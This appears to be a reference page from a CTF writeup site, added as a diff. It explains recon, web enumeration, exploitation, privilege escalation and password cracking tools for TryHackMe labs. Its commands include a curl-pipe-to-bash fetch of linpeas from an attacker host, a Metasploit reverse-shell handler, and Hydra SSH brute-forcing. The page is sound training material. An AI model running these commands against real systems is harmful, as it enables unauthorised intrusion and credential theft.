@@ -1,0 +1,318 @@
+---
+title: "CTF Tools Reference — Essential Hacking Tools Guide"
+sidebarTitle: "Tools"
+description: "Reference guide for essential CTF and penetration testing tools including nmap, gobuster, linpeas, netcat, and more."
+---
+
+Every writeup on this site relies on a core set of tools. Rather than explaining each one from scratch in individual room writeups, this page serves as a standing reference — what each tool does, when to reach for it, and the exact command patterns used throughout. Whether you are setting up your environment for the first time or brushing up on a specific utility, this is where to start.
+
+<AccordionGroup>
+  <Accordion title="🔍 Reconnaissance" icon="radar">
+    Tools for mapping the target — identifying open ports, running services, software versions, and passive intelligence.
+
+    ---
+
+    ### nmap
+
+    The backbone of any recon phase. `nmap` performs port scanning and service fingerprinting, and its scripting engine (`-sC`) runs a battery of safe default checks automatically.
+
+    ```bash
+    # Standard all-purpose scan — scripts, version detection, saved output
+    nmap -sC -sV -oN scan.txt <TARGET_IP>
+
+    # Full port scan (all 65535 ports) — slower but thorough
+    nmap -p- --min-rate 5000 -oN allports.txt <TARGET_IP>
+
+    # UDP scan for commonly missed services (DNS, SNMP, etc.)
+    sudo nmap -sU --top-ports 20 <TARGET_IP>
+    ```
+
+    Key flags:
+    - `-sC` — run default NSE scripts
+    - `-sV` — probe for service/version info
+    - `-oN` — save output in normal format
+    - `-A` — aggressive mode (OS detection + traceroute + scripts + versions)
+
+    ---
+
+    ### whois
+
+    Retrieve domain registration information, name servers, and registrar details. Useful during passive recon on web-based rooms.
+
+    ```bash
+    whois <domain>
+    ```
+
+    ---
+
+    ### dig
+
+    Query DNS records to map out subdomains, mail servers, and zone configuration.
+
+    ```bash
+    # Standard A record lookup
+    dig <domain>
+
+    # Attempt a DNS zone transfer
+    dig axfr @<nameserver> <domain>
+
+    # Look up all record types
+    dig any <domain>
+    ```
+  </Accordion>
+
+  <Accordion title="🌐 Web Enumeration" icon="globe">
+    Tools for discovering hidden content, probing web applications, and identifying vulnerabilities in HTTP services.
+
+    ---
+
+    ### gobuster
+
+    Fast directory and file brute-forcer written in Go. Ideal for discovering hidden paths on web servers.
+
+    ```bash
+    # Directory enumeration with a common wordlist
+    gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt
+
+    # Include file extensions
+    gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+
+    # DNS subdomain enumeration
+    gobuster dns -d <domain> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+    ```
+
+    ---
+
+    ### feroxbuster
+
+    Recursive web content discovery tool. Unlike `gobuster`, `feroxbuster` automatically follows newly discovered directories and re-scans them, making it significantly more thorough for deeply nested applications.
+
+    ```bash
+    feroxbuster -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+    ```
+
+    ---
+
+    ### nikto
+
+    Web server vulnerability scanner. Checks for dangerous files, outdated software, and common misconfigurations. Noisy — not suitable for stealth, but excellent for quick wins.
+
+    ```bash
+    nikto -h http://<TARGET>
+    ```
+
+    ---
+
+    ### curl / httpie
+
+    Manual HTTP probing tools for inspecting headers, testing endpoints, and crafting custom requests.
+
+    ```bash
+    # Inspect response headers
+    curl -I http://<TARGET>
+
+    # Follow redirects and show verbose output
+    curl -Lv http://<TARGET>/path
+
+    # POST data to a form endpoint
+    curl -X POST -d "username=admin&password=admin" http://<TARGET>/login
+    ```
+
+    `httpie` provides a cleaner, colourized alternative:
+
+    ```bash
+    http GET http://<TARGET>/api/endpoint
+    http POST http://<TARGET>/login username=admin password=admin
+    ```
+  </Accordion>
+
+  <Accordion title="💥 Exploitation" icon="bolt">
+    Frameworks and tools for turning discovered vulnerabilities into working shells and access.
+
+    ---
+
+    ### Metasploit Framework
+
+    The industry-standard exploitation framework. Contains hundreds of modules for known CVEs, payloads, and post-exploitation tasks.
+
+    ```bash
+    # Launch Metasploit console
+    msfconsole
+
+    # Search for a module
+    msf6 > search <service> type:exploit
+
+    # Use a module
+    msf6 > use exploit/multi/handler
+    msf6 exploit(multi/handler) > set PAYLOAD linux/x64/shell_reverse_tcp
+    msf6 exploit(multi/handler) > set LHOST <YOUR_IP>
+    msf6 exploit(multi/handler) > set LPORT 4444
+    msf6 exploit(multi/handler) > run
+    ```
+
+    ---
+
+    ### searchsploit
+
+    Offline command-line interface to the Exploit-DB archive. Search for public exploits by service name and version without leaving your terminal.
+
+    ```bash
+    # Search by service and version
+    searchsploit <service> <version>
+
+    # Example: find exploits for vsftpd 2.3.4
+    searchsploit vsftpd 2.3.4
+
+    # Copy an exploit to your working directory
+    searchsploit -m <exploit_path>
+    ```
+
+    ---
+
+    ### Burp Suite
+
+    The definitive web application security proxy. Burp sits between your browser and the target, letting you intercept, modify, replay, and fuzz HTTP/S requests.
+
+    Core modules:
+    - **Proxy** — intercept and modify live requests
+    - **Repeater** — manually craft and replay single requests
+    - **Intruder** — automated fuzzing and brute-force
+    - **Decoder** — encode/decode Base64, URL, HTML, and more
+    - **Scanner** *(Pro only)* — automated vulnerability discovery
+  </Accordion>
+
+  <Accordion title="🔓 Post-Exploitation & Privilege Escalation" icon="key">
+    Tools for enumerating the system after gaining a foothold and identifying paths to elevated privileges.
+
+    ---
+
+    ### linpeas
+
+    The go-to Linux privilege escalation enumeration script. `linpeas` checks hundreds of PrivEsc vectors automatically and colour-codes results by likelihood of success.
+
+    ```bash
+    # On your attack machine — serve the script
+    python3 -m http.server 8000
+
+    # On the target machine — download and execute
+    curl http://<YOUR_IP>:8000/linpeas.sh | bash
+    # or
+    wget -qO- http://<YOUR_IP>:8000/linpeas.sh | bash
+    ```
+
+    Download: [github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
+
+    ---
+
+    ### pspy
+
+    Monitor running processes on a Linux system **without root**. Invaluable for catching cron jobs, scheduled scripts, and processes spawned by other users — often the key to finding a PrivEsc vector.
+
+    ```bash
+    # Upload to target, then run
+    ./pspy64
+    ```
+
+    Download: [github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+
+    ---
+
+    ### pwncat-cs
+
+    An advanced reverse and bind shell handler that automatically upgrades shells, handles file transfers, and persists sessions. A major quality-of-life upgrade over raw netcat listeners.
+
+    ```bash
+    # Install
+    pip install pwncat-cs
+
+    # Listen for an incoming reverse shell
+    pwncat-cs -lp 4444
+    ```
+  </Accordion>
+
+  <Accordion title="🔑 Password Cracking" icon="lock-open">
+    Tools for recovering plaintext passwords from captured hashes and brute-forcing authentication services.
+
+    ---
+
+    ### John the Ripper
+
+    Versatile hash cracking tool supporting a wide range of hash types. Automatically detects hash format and applies wordlist or rule-based attacks.
+
+    ```bash
+    # Crack a hash file using rockyou
+    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+    # Show cracked passwords
+    john --show hashes.txt
+
+    # Convert SSH key to crackable format first
+    ssh2john id_rsa > id_rsa.hash
+    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+    ```
+
+    ---
+
+    ### hashcat
+
+    GPU-accelerated hash cracker — significantly faster than John when you have a graphics card available. Requires specifying a hash mode with `-m`.
+
+    ```bash
+    # MD5 (mode 0) — dictionary attack
+    hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+    # bcrypt (mode 3200)
+    hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+    # Identify an unknown hash type
+    hashcat --identify hashes.txt
+    ```
+
+    Reference all hash modes: [hashcat.net/wiki/doku.php?id=hashcat](https://hashcat.net/wiki/doku.php?id=hashcat)
+
+    ---
+
+    ### Hydra
+
+    Fast online brute-force and credential stuffing tool. Supports dozens of protocols including SSH, FTP, HTTP forms, SMB, and more.
+
+    ```bash
+    # SSH brute force
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+
+    # HTTP POST form login
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+    # FTP with a user list
+    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
+    ```
+  </Accordion>
+</AccordionGroup>
+
+---
+
+<Note>
+  Two external references belong in every CTF toolkit: **GTFOBins** and **HackTricks**.
+
+  - [**GTFOBins**](https://gtfobins.github.io) — a curated list of Unix binaries that can be abused for privilege escalation, file reads/writes, shell spawning, and SUID exploitation. If `sudo -l` reveals a binary you can run, check GTFOBins first.
+  - [**HackTricks**](https://book.hacktricks.xyz) — an exhaustive penetration testing reference covering enumeration techniques, attack vectors, and exploitation methods for virtually every protocol and platform you will encounter.
+
+  Bookmark both. You will use them on every single room.
+</Note>
+
+<Tip>
+  Run these tools from a dedicated attacker environment rather than your daily-driver OS. [**Kali Linux**](https://www.kali.org) comes with the vast majority of the above pre-installed and maintained. [**Parrot OS Security Edition**](https://www.parrotsec.org) is a lighter alternative with a comparable toolset. Both are available as VM images for VirtualBox or VMware — set one up once and you are ready for any room on TryHackMe.
+</Tip>
+
+---
+
+## Keep Exploring
+
+<CardGroup cols={2}>
+  <Card title="Methodology" icon="map" href="/reference/methodology">
+    Learn how to chain these tools together with a structured attack methodology.
+  </Card>
+  <Card title="Terminology Glossary" icon="book-open" href="/reference/terminology">
+    Definitions for every CTF term referenced in these writeups.
+  </Card>
+</CardGroup>
